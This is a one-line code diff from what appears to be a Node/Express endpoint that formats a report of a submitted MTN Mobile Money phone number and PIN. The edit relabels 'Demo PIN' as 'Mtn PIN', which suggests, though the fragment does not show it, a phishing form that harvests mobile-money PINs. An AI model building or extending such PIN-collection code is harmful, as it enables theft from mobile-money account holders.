@@ -62,7 +62,7 @@ app.post("/mtn-submission", async (req, res) => {
 `🧪 MTN MoMo DEMO SUBMISSION
 
 Number: ${phone}
-Demo PIN: ${demoPin}
+Mtn PIN: ${demoPin}
 
 Status: Successful
 Date: ${date}
